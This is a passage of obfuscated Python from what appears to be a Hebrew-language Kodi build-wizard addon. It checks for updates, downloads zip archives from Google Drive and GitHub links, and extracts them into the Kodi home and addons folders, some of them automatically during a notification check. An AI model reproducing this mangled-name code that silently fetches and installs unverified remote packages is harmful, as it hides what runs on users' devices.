	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5159
	if ENABLE =='Yes':#line:5160
		if not NOTIFY =='true':#line:5161
			OO0O0O00000OOO0OO =wiz .workingURL (NOTIFICATION )#line:5162
			if OO0O0O00000OOO0OO ==True :#line:5163
				O0O000000OO0O000O ,OO000OOO0000O0O00 =wiz .splitNotify (NOTIFICATION )#line:5164
				if not O0O000000OO0O000O ==False :#line:5166
					try :#line:5167
						O0O000000OO0O000O =int (O0O000000OO0O000O );OOO0OO00000OOOOO0 =int (OOO0OO00000OOOOO0 )#line:5168
						checkidupdate ()#line:5169
						wiz .setS ("notedismiss","true")#line:5170
						if O0O000000OO0O000O ==OOO0OO00000OOOOO0 :#line:5171
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O000000OO0O000O ),xbmc .LOGNOTICE )#line:5172
						elif O0O000000OO0O000O >OOO0OO00000OOOOO0 :#line:5174
							wiz .log ("[Notifications] id: %s"%str (O0O000000OO0O000O ),xbmc .LOGNOTICE )#line:5175
							wiz .setS ('noteid',str (O0O000000OO0O000O ))#line:5176
							wiz .setS ("notedismiss","true")#line:5177
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5180
					except Exception as OOO0O00OO00OO00O0 :#line:5181
						wiz .log ("Error on Notifications Window: %s"%str (OOO0O00OO00OO00O0 ),xbmc .LOGERROR )#line:5182
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5184
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0O0O00000OOO0OO ),xbmc .LOGNOTICE )#line:5185
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5186
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5187
def checkUpdate ():#line:5189
	OO0O0OOOOOOOO0O0O =wiz .getS ('disableupdate')#line:5190
	OO0000O00O0OOOO00 =wiz .getS ('buildname')#line:5191
	OOOOO0OO00OO000O0 =wiz .getS ('buildversion')#line:5192
	O0OOO0000OOO0OOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5193
	OO0O0OO000OOO0OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OO0000O00O0OOOO00 ).findall (O0OOO0000OOO0OOO0 )#line:5194
	if len (OO0O0OO000OOO0OO0 )>0 :#line:5195
		O0000OOO0000O0000 =OO0O0OO000OOO0OO0 [0 ][0 ]#line:5196
		OO0OOO0OOO00000O0 =OO0O0OO000OOO0OO0 [0 ][1 ]#line:5197
		OOO0OO00OO000OOOO =OO0O0OO000OOO0OO0 [0 ][2 ]#line:5198
		wiz .setS ('latestversion',O0000OOO0000O0000 )#line:5199
		if O0000OOO0000O0000 >OOOOO0OO00OO000O0 :#line:5200
			if OO0O0OOOOOOOO0O0O =='false':#line:5201
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OOOOO0OO00OO000O0 ,O0000OOO0000O0000 ),xbmc .LOGNOTICE )#line:5202
				notify .updateWindow (OO0000O00O0OOOO00 ,OOOOO0OO00OO000O0 ,O0000OOO0000O0000 ,OO0OOO0OOO00000O0 ,OOO0OO00OO000OOOO )#line:5203
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OOOOO0OO00OO000O0 ,O0000OOO0000O0000 ),xbmc .LOGNOTICE )#line:5204
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OOOOO0OO00OO000O0 ,O0000OOO0000O0000 ),xbmc .LOGNOTICE )#line:5205
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5206
def updatetelemedia (O0O00OOOOO00000O0 ):#line:5207
    from startup import teleupdate #line:5208
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5209
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5210
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5211
    wiz .wizardUpdate ('startup')#line:5212
    checkUpdate ()#line:5214
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5215
    time .sleep (15.0 )#line:5216
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5217
     if teleupdate is False :#line:5218
        STARTP2 ()#line:5220
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5221
        if not NOTIFY =='true':#line:5222
            O0OOO00O000000OOO =wiz .workingURL (NOTIFICATION )#line:5223
            if O0OOO00O000000OOO ==True :#line:5224
                O0OO0000O0OOOO00O ,OO0O00O0O000O0OO0 =wiz .splitNotify (NOTIFICATION )#line:5225
                if not O0OO0000O0OOOO00O ==False :#line:5226
                    try :#line:5227
                        O0OO0000O0OOOO00O =int (O0OO0000O0OOOO00O );O0O00OOOOO00000O0 =int (O0O00OOOOO00000O0 )#line:5228
                        if O0OO0000O0OOOO00O ==O0O00OOOOO00000O0 :#line:5229
                            if NOTEDISMISS =='false':#line:5230
                                debridit .debridIt ('update','all')#line:5231
                                traktit .traktIt ('update','all')#line:5232
                                checkidupdatetele ()#line:5233
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OO0000O0OOOO00O ),xbmc .LOGNOTICE )#line:5234
                        elif O0OO0000O0OOOO00O >O0O00OOOOO00000O0 :#line:5235
                            wiz .log ("[Notifications] id: %s"%str (O0OO0000O0OOOO00O ),xbmc .LOGNOTICE )#line:5236
                            wiz .setS ('noteid',str (O0OO0000O0OOOO00O ))#line:5237
                            wiz .setS ('notedismiss','false')#line:5238
                            debridit .debridIt ('update','all')#line:5240
                            traktit .traktIt ('update','all')#line:5241
                            checkidupdatetele ()#line:5242
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5244
                    except Exception as O0O0OOOO0O0000O0O :#line:5245
                        wiz .log ("Error on Notifications Window: %s"%str (O0O0OOOO0O0000O0O ),xbmc .LOGERROR )#line:5246
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5247
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0OOO00O000000OOO ),xbmc .LOGNOTICE )#line:5248
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5249
def checkidupdate ():#line:5253
				wiz .setS ("notedismiss","true")#line:5255
				OO0O0O0OOO0OO0O00 =wiz .workingURL (NOTIFICATION )#line:5256
				OOOOOOO0O000OO0OO =" Kodi Premium"#line:5258
				O0O0O000O0O000OOO =wiz .checkBuild (OOOOOOO0O000OO0OO ,'gui')#line:5259
				OO000O0O0000OO0O0 =OOOOOOO0O000OO0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5260
				if not wiz .workingURL (O0O0O000O0O000OOO )==True :return #line:5261
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5262
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOOOOOO0O000OO0OO ),'','אנא המתן')#line:5263
				OO0O0O0OO0OO00OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO000O0O0000OO0O0 )#line:5264
				try :os .remove (OO0O0O0OO0OO00OO0 )#line:5265
				except :pass #line:5266
				logging .warning (O0O0O000O0O000OOO )#line:5267
				if 'google'in O0O0O000O0O000OOO :#line:5268
				   O0O00O0O0OO0000OO =googledrive_download (O0O0O000O0O000OOO ,OO0O0O0OO0OO00OO0 ,DP ,wiz .checkBuild (OOOOOOO0O000OO0OO ,'filesize'))#line:5269
				else :#line:5272
				  downloader .download (O0O0O000O0O000OOO ,OO0O0O0OO0OO00OO0 ,DP )#line:5273
				xbmc .sleep (100 )#line:5274
				O0O0OO00000000O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOO0O000OO0OO )#line:5275
				DP .update (0 ,O0O0OO00000000O0O ,'','אנא המתן')#line:5276
				extract .all (OO0O0O0OO0OO00OO0 ,HOME ,DP ,title =O0O0OO00000000O0O )#line:5277
				DP .close ()#line:5278
				wiz .defaultSkin ()#line:5279
				wiz .lookandFeelData ('save')#line:5280
				if KODIV >=18 :#line:5281
					skindialogsettind18 ()#line:5282
				if INSTALLMETHOD ==1 :OOOOO0O0000O00OOO =1 #line:5285
				elif INSTALLMETHOD ==2 :OOOOO0O0000O00OOO =0 #line:5286
				else :DP .close ()#line:5287
def checkidupdatetele ():#line:5288
				wiz .setS ("notedismiss","true")#line:5290
				O0OOOOOO0OOOOOOO0 =wiz .workingURL (NOTIFICATION )#line:5291
				OOO00O0OOO0O00O00 =" Kodi Premium"#line:5293
				OO000OO0000OOOO00 =wiz .checkBuild (OOO00O0OOO0O00O00 ,'gui')#line:5294
				O0O00OO0OOO0O0000 =OOO00O0OOO0O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5295
				if not wiz .workingURL (OO000OO0000OOOO00 )==True :return #line:5296
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5297
				O00000OO0O0000OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O00OO0OOO0O0000 )#line:5300
				try :os .remove (O00000OO0O0000OOO )#line:5301
				except :pass #line:5302
				if 'google'in OO000OO0000OOOO00 :#line:5304
				   OOO00000O0O0OOO0O =googledrive_download (OO000OO0000OOOO00 ,O00000OO0O0000OOO ,DP2 ,wiz .checkBuild (OOO00O0OOO0O00O00 ,'filesize'))#line:5305
				else :#line:5308
				  downloaderbg .download3 (OO000OO0000OOOO00 ,O00000OO0O0000OOO ,DP2 )#line:5309
				xbmc .sleep (100 )#line:5310
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5311
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5313
				extract .all2 (O00000OO0O0000OOO ,HOME ,DP2 )#line:5315
				DP2 .close ()#line:5316
				wiz .defaultSkin ()#line:5317
				wiz .lookandFeelData ('save')#line:5318
				wiz .kodi17Fix ()#line:5319
				if KODIV >=18 :#line:5320
					skindialogsettind18 ()#line:5321
				debridit .debridIt ('restore','all')#line:5326
				traktit .traktIt ('restore','all')#line:5327
				if INSTALLMETHOD ==1 :OOOO0000OO0O0O000 =1 #line:5328
				elif INSTALLMETHOD ==2 :OOOO0000OO0O0O000 =0 #line:5329
				else :DP2 .close ()#line:5330
				O00O00O00O0O0O0O0 =(NOTIFICATION2 )#line:5331
				OO00OOO0O0OO00OO0 =urllib2 .urlopen (O00O00O00O0O0O0O0 )#line:5332
				O00000OO0O000O00O =OO00OOO0O0OO00OO0 .readlines ()#line:5333
				OO00OO00OO00OOOO0 =0 #line:5334
				for OOO0000O00OO000O0 in O00000OO0O000O00O :#line:5337
					if OOO0000O00OO000O0 .split (' ==')[0 ]=="noreset"or OOO0000O00OO000O0 .split ()[0 ]=="noreset":#line:5338
						xbmc .executebuiltin ("ReloadSkin()")#line:5340
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5341
						OO0OO00OOO00O0000 =(ADDON .getSetting ("message"))#line:5342
						if OO0OO00OOO00O0000 =='true':#line:5343
							infobuild ()#line:5344
						update_Votes ()#line:5345
						indicatorfastupdate ()#line:5346
					if OOO0000O00OO000O0 .split (' ==')[0 ]=="reset"or OOO0000O00OO000O0 .split ()[0 ]=="reset":#line:5347
						update_Votes ()#line:5349
						indicatorfastupdate ()#line:5350
						resetkodi ()#line:5351
def gaiaserenaddon ():#line:5352
  OO000O00000O0O0OO =(ADDON .getSetting ("gaiaseren"))#line:5353
  O0OOOOO000O0O00O0 =(ADDON .getSetting ("auto_rd"))#line:5354
  if OO000O00000O0O0OO =='true'and O0OOOOO000O0O00O0 =='true':#line:5355
    O000O0O00O0OOO00O =(NEWFASTUPDATE )#line:5356
    OOOO000000OOO00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5357
    OOO0OO0OOO0000OOO =xbmcgui .DialogProgress ()#line:5358
    OOO0OO0OOO0000OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5359
    O0OOO0OO000O0O00O =os .path .join (PACKAGES ,'isr.zip')#line:5360
    OO0O00OO0OOOO0OOO =urllib2 .Request (O000O0O00O0OOO00O )#line:5361
    OOOOO0O0OO0O00OO0 =urllib2 .urlopen (OO0O00OO0OOOO0OOO )#line:5362
    OO0OOO0000O0000OO =xbmcgui .DialogProgress ()#line:5364
    OO0OOO0000O0000OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5365
    OO0OOO0000O0000OO .update (0 )#line:5366
    OOO00O0O00O0O0O0O =open (O0OOO0OO000O0O00O ,'wb')#line:5368
    try :#line:5370
      O0OOOOO00OO000O00 =OOOOO0O0OO0O00OO0 .info ().getheader ('Content-Length').strip ()#line:5371
      OOO0O0O0OO00O00O0 =True #line:5372
    except AttributeError :#line:5373
          OOO0O0O0OO00O00O0 =False #line:5374
    if OOO0O0O0OO00O00O0 :#line:5376
          O0OOOOO00OO000O00 =int (O0OOOOO00OO000O00 )#line:5377
    O0OOO0000OO0OO000 =0 #line:5379
    OO0OOOO000O0OOOOO =time .time ()#line:5380
    while True :#line:5381
          O0OOOO0OO00O0O00O =OOOOO0O0OO0O00OO0 .read (8192 )#line:5382
          if not O0OOOO0OO00O0O00O :#line:5383
              sys .stdout .write ('\n')#line:5384
              break #line:5385
          O0OOO0000OO0OO000 +=len (O0OOOO0OO00O0O00O )#line:5387
          OOO00O0O00O0O0O0O .write (O0OOOO0OO00O0O00O )#line:5388
          if not OOO0O0O0OO00O00O0 :#line:5390
              O0OOOOO00OO000O00 =O0OOO0000OO0OO000 #line:5391
          if OO0OOO0000O0000OO .iscanceled ():#line:5392
             OO0OOO0000O0000OO .close ()#line:5393
             try :#line:5394
              os .remove (O0OOO0OO000O0O00O )#line:5395
             except :#line:5396
              pass #line:5397
             break #line:5398
          O0OO00OOO00O000OO =float (O0OOO0000OO0OO000 )/O0OOOOO00OO000O00 #line:5399
          O0OO00OOO00O000OO =round (O0OO00OOO00O000OO *100 ,2 )#line:5400
          O0O00O0O000O0O00O =O0OOO0000OO0OO000 /(1024 *1024 )#line:5401
          O0OOO00O0O0O0OO00 =O0OOOOO00OO000O00 /(1024 *1024 )#line:5402
          O00000O00000O0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00O0O000O0O00O ,'teal',O0OOO00O0O0O0OO00 )#line:5403
          if (time .time ()-OO0OOOO000O0OOOOO )>0 :#line:5404
            O0000OOOOOOO00OOO =O0OOO0000OO0OO000 /(time .time ()-OO0OOOO000O0OOOOO )#line:5405
            O0000OOOOOOO00OOO =O0000OOOOOOO00OOO /1024 #line:5406
          else :#line:5407
           O0000OOOOOOO00OOO =0 #line:5408
          OO00O000000O00000 ='KB'#line:5409
          if O0000OOOOOOO00OOO >=1024 :#line:5410
             O0000OOOOOOO00OOO =O0000OOOOOOO00OOO /1024 #line:5411
             OO00O000000O00000 ='MB'#line:5412
          if O0000OOOOOOO00OOO >0 and not O0OO00OOO00O000OO ==100 :#line:5413
              OO00O000O0O0O0O00 =(O0OOOOO00OO000O00 -O0OOO0000OO0OO000 )/O0000OOOOOOO00OOO #line:5414
          else :#line:5415
              OO00O000O0O0O0O00 =0 #line:5416
          OO0OOO0OO00OO00OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0000OOOOOOO00OOO ,OO00O000000O00000 )#line:5417
          OO0OOO0000O0000OO .update (int (O0OO00OOO00O000OO ),O00000O00000O0O00 ,OO0OOO0OO00OO00OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5419
    OOO000O0O0OOOO0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5422
    OOO00O0O00O0O0O0O .close ()#line:5425
    extract .all (O0OOO0OO000O0O00O ,OOO000O0O0OOOO0OO ,OO0OOO0000O0000OO )#line:5426
    try :#line:5430
      os .remove (O0OOO0OO000O0O00O )#line:5431
    except :#line:5432
      pass #line:5433
def iptvsimpldownpc ():#line:5434
    O00OO0OOO0OOOO0O0 =(IPTVSIMPL18PC )#line:5436
    OOO0OO0OOO00O0O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5437
    OOO0O00OO0000O000 =xbmcgui .DialogProgress ()#line:5438
    OOO0O00OO0000O000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5439
    O0O0OOO0OOO000OOO =os .path .join (PACKAGES ,'isr.zip')#line:5440
    O0OO000O00OO0O00O =urllib2 .Request (O00OO0OOO0OOOO0O0 )#line:5441
    OOO000OO00O00000O =urllib2 .urlopen (O0OO000O00OO0O00O )#line:5442
    OO000O00OOO000000 =xbmcgui .DialogProgress ()#line:5444
    OO000O00OOO000000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5445
    OO000O00OOO000000 .update (0 )#line:5446
    O0O00OOO0000000O0 =open (O0O0OOO0OOO000OOO ,'wb')#line:5448
    try :#line:5450
      O0OOOOO0OO000O000 =OOO000OO00O00000O .info ().getheader ('Content-Length').strip ()#line:5451
      OO0O0OOO0OOOO00OO =True #line:5452
    except AttributeError :#line:5453
          OO0O0OOO0OOOO00OO =False #line:5454
    if OO0O0OOO0OOOO00OO :#line:5456
          O0OOOOO0OO000O000 =int (O0OOOOO0OO000O000 )#line:5457
    OOOO00000000OOO00 =0 #line:5459
    OOOO0OO0000OOOO00 =time .time ()#line:5460
    while True :#line:5461
          O000O0OO0OOO00OOO =OOO000OO00O00000O .read (8192 )#line:5462
          if not O000O0OO0OOO00OOO :#line:5463
              sys .stdout .write ('\n')#line:5464
              break #line:5465
          OOOO00000000OOO00 +=len (O000O0OO0OOO00OOO )#line:5467
          O0O00OOO0000000O0 .write (O000O0OO0OOO00OOO )#line:5468
          if not OO0O0OOO0OOOO00OO :#line:5470
              O0OOOOO0OO000O000 =OOOO00000000OOO00 #line:5471
          if OO000O00OOO000000 .iscanceled ():#line:5472
             OO000O00OOO000000 .close ()#line:5473
             try :#line:5474
              os .remove (O0O0OOO0OOO000OOO )#line:5475
             except :#line:5476
              pass #line:5477
             break #line:5478
          O00O0OO0O000OO000 =float (OOOO00000000OOO00 )/O0OOOOO0OO000O000 #line:5479
          O00O0OO0O000OO000 =round (O00O0OO0O000OO000 *100 ,2 )#line:5480
          O0O00OO0OO0O00O0O =OOOO00000000OOO00 /(1024 *1024 )#line:5481
          OO00000O0000000OO =O0OOOOO0OO000O000 /(1024 *1024 )#line:5482
          O00O0O0OO0O000O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00OO0OO0O00O0O ,'teal',OO00000O0000000OO )#line:5483
          if (time .time ()-OOOO0OO0000OOOO00 )>0 :#line:5484
            OOOOOOOOOO0OOOOOO =OOOO00000000OOO00 /(time .time ()-OOOO0OO0000OOOO00 )#line:5485
            OOOOOOOOOO0OOOOOO =OOOOOOOOOO0OOOOOO /1024 #line:5486
          else :#line:5487
           OOOOOOOOOO0OOOOOO =0 #line:5488
          O0OO00O0O0OO000OO ='KB'#line:5489
          if OOOOOOOOOO0OOOOOO >=1024 :#line:5490
             OOOOOOOOOO0OOOOOO =OOOOOOOOOO0OOOOOO /1024 #line:5491
             O0OO00O0O0OO000OO ='MB'#line:5492
          if OOOOOOOOOO0OOOOOO >0 and not O00O0OO0O000OO000 ==100 :#line:5493
              OOO0OO0O0O0OOOOO0 =(O0OOOOO0OO000O000 -OOOO00000000OOO00 )/OOOOOOOOOO0OOOOOO #line:5494
          else :#line:5495
              OOO0OO0O0O0OOOOO0 =0 #line:5496
          OO00O000OO0OO0OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOOOOOO0OOOOOO ,O0OO00O0O0OO000OO )#line:5497
          OO000O00OOO000000 .update (int (O00O0OO0O000OO000 ),O00O0O0OO0O000O0O ,OO00O000OO0OO0OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5499
    OO0OO000000OOO00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5502
    O0O00OOO0000000O0 .close ()#line:5505
    extract .all (O0O0OOO0OOO000OOO ,OO0OO000000OOO00O ,OO000O00OOO000000 )#line:5506
    try :#line:5510
      os .remove (O0O0OOO0OOO000OOO )#line:5511
    except :#line:5512
      pass #line:5513
def iptvkodi18idan ():#line:5514
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5516
              O0OO0OOOOOO00OOOO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5519
              O0O00O000O0O0O0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5520
              OOOOO0O000O0OO000 =xbmcgui .DialogProgress ()#line:5521
              OOOOO0O000O0OO000 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5522
              O00OOO0OO00O000O0 =os .path .join (O0O00O000O0O0O0OO ,'isr.zip')#line:5523
              O0O0OO0O0OOOO0O00 =urllib2 .Request (O0OO0OOOOOO00OOOO )#line:5524
              O00O0OO0O00O00OOO =urllib2 .urlopen (O0O0OO0O0OOOO0O00 )#line:5525
              O0OO000O00O00OO0O =xbmcgui .DialogProgress ()#line:5527
              O0OO000O00O00OO0O .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5528
              O0OO000O00O00OO0O .update (0 )#line:5529
              O0O000O00O0O0O0O0 =open (O00OOO0OO00O000O0 ,'wb')#line:5531
              try :#line:5533
                O00000O00O0O00OO0 =O00O0OO0O00O00OOO .info ().getheader ('Content-Length').strip ()#line:5534
                O0OOOO000O0OOO0OO =True #line:5535
              except AttributeError :#line:5536
                    O0OOOO000O0OOO0OO =False #line:5537
              if O0OOOO000O0OOO0OO :#line:5539
                    O00000O00O0O00OO0 =int (O00000O00O0O00OO0 )#line:5540
              O0000O00000OOO0O0 =0 #line:5542
              O0000O000OOOO000O =time .time ()#line:5543
              while True :#line:5544
                    O0O000OOOO0OOOOO0 =O00O0OO0O00O00OOO .read (8192 )#line:5545
                    if not O0O000OOOO0OOOOO0 :#line:5546
                        sys .stdout .write ('\n')#line:5547
                        break #line:5548
                    O0000O00000OOO0O0 +=len (O0O000OOOO0OOOOO0 )#line:5550
                    O0O000O00O0O0O0O0 .write (O0O000OOOO0OOOOO0 )#line:5551
                    if not O0OOOO000O0OOO0OO :#line:5553
                        O00000O00O0O00OO0 =O0000O00000OOO0O0 #line:5554
                    if O0OO000O00O00OO0O .iscanceled ():#line:5555
                       O0OO000O00O00OO0O .close ()#line:5556
                       try :#line:5557
                        os .remove (O00OOO0OO00O000O0 )#line:5558
                       except :#line:5559
                        pass #line:5560
                       break #line:5561
                    O0OOOO0O0OOO0000O =float (O0000O00000OOO0O0 )/O00000O00O0O00OO0 #line:5562
                    O0OOOO0O0OOO0000O =round (O0OOOO0O0OOO0000O *100 ,2 )#line:5563
                    O0000OO0OO00OO000 =O0000O00000OOO0O0 /(1024 *1024 )#line:5564
                    OOO0O0O000OOOOOOO =O00000O00O0O00OO0 /(1024 *1024 )#line:5565
                    OOOO0O000OO00000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000OO0OO00OO000 ,'teal',OOO0O0O000OOOOOOO )#line:5566
                    if (time .time ()-O0000O000OOOO000O )>0 :#line:5567
                      O0OOOO0OOOOOOO000 =O0000O00000OOO0O0 /(time .time ()-O0000O000OOOO000O )#line:5568
                      O0OOOO0OOOOOOO000 =O0OOOO0OOOOOOO000 /1024 #line:5569
                    else :#line:5570
                     O0OOOO0OOOOOOO000 =0 #line:5571
                    OO0O00O0O000OO0OO ='KB'#line:5572
                    if O0OOOO0OOOOOOO000 >=1024 :#line:5573
                       O0OOOO0OOOOOOO000 =O0OOOO0OOOOOOO000 /1024 #line:5574
                       OO0O00O0O000OO0OO ='MB'#line:5575
                    if O0OOOO0OOOOOOO000 >0 and not O0OOOO0O0OOO0000O ==100 :#line:5576
                        O00OO00O0OOO000OO =(O00000O00O0O00OO0 -O0000O00000OOO0O0 )/O0OOOO0OOOOOOO000 #line:5577
                    else :#line:5578
                        O00OO00O0OOO000OO =0 #line:5579
                    OOO00000O00O00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOO0OOOOOOO000 ,OO0O00O0O000OO0OO )#line:5580
                    O0OO000O00O00OO0O .update (int (O0OOOO0O0OOO0000O ),"Downloading "+'iptv',OOOO0O000OO00000O ,OOO00000O00O00O00 )#line:5582
              OO0OO00000000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5585
              O0O000O00O0O0O0O0 .close ()#line:5588
              extract .all (O00OOO0OO00O000O0 ,OO0OO00000000OOO0 ,O0OO000O00O00OO0O )#line:5589
              try :#line:5592
                os .remove (O00OOO0OO00O000O0 )#line:5593
              except :#line:5595
                pass #line:5596
              O0OO000O00O00OO0O .close ()#line:5597
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5600
              O0OO0OOOOOO00OOOO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5602
              O0O00O000O0O0O0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5603
              OOOOO0O000O0OO000 =xbmcgui .DialogProgress ()#line:5604
              OOOOO0O000O0OO000 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5605
              O00OOO0OO00O000O0 =os .path .join (O0O00O000O0O0O0OO ,'isr.zip')#line:5606
              O0O0OO0O0OOOO0O00 =urllib2 .Request (O0OO0OOOOOO00OOOO )#line:5607
              O00O0OO0O00O00OOO =urllib2 .urlopen (O0O0OO0O0OOOO0O00 )#line:5608
              O0OO000O00O00OO0O =xbmcgui .DialogProgress ()#line:5610
              O0OO000O00O00OO0O .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5611
              O0OO000O00O00OO0O .update (0 )#line:5612
              O0O000O00O0O0O0O0 =open (O00OOO0OO00O000O0 ,'wb')#line:5614
              try :#line:5616
                O00000O00O0O00OO0 =O00O0OO0O00O00OOO .info ().getheader ('Content-Length').strip ()#line:5617
                O0OOOO000O0OOO0OO =True #line:5618
              except AttributeError :#line:5619
                    O0OOOO000O0OOO0OO =False #line:5620
              if O0OOOO000O0OOO0OO :#line:5622
                    O00000O00O0O00OO0 =int (O00000O00O0O00OO0 )#line:5623
              O0000O00000OOO0O0 =0 #line:5625
              O0000O000OOOO000O =time .time ()#line:5626
              while True :#line:5627
                    O0O000OOOO0OOOOO0 =O00O0OO0O00O00OOO .read (8192 )#line:5628
                    if not O0O000OOOO0OOOOO0 :#line:5629
                        sys .stdout .write ('\n')#line:5630
                        break #line:5631
                    O0000O00000OOO0O0 +=len (O0O000OOOO0OOOOO0 )#line:5633
                    O0O000O00O0O0O0O0 .write (O0O000OOOO0OOOOO0 )#line:5634
                    if not O0OOOO000O0OOO0OO :#line:5636
                        O00000O00O0O00OO0 =O0000O00000OOO0O0 #line:5637
                    if O0OO000O00O00OO0O .iscanceled ():#line:5638
                       O0OO000O00O00OO0O .close ()#line:5639
                       try :#line:5640
                        os .remove (O00OOO0OO00O000O0 )#line:5641
                       except :#line:5642
                        pass #line:5643
                       break #line:5644
                    O0OOOO0O0OOO0000O =float (O0000O00000OOO0O0 )/O00000O00O0O00OO0 #line:5645
                    O0OOOO0O0OOO0000O =round (O0OOOO0O0OOO0000O *100 ,2 )#line:5646
                    O0000OO0OO00OO000 =O0000O00000OOO0O0 /(1024 *1024 )#line:5647
                    OOO0O0O000OOOOOOO =O00000O00O0O00OO0 /(1024 *1024 )#line:5648
                    OOOO0O000OO00000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000OO0OO00OO000 ,'teal',OOO0O0O000OOOOOOO )#line:5649
                    if (time .time ()-O0000O000OOOO000O )>0 :#line:5650
                      O0OOOO0OOOOOOO000 =O0000O00000OOO0O0 /(time .time ()-O0000O000OOOO000O )#line:5651
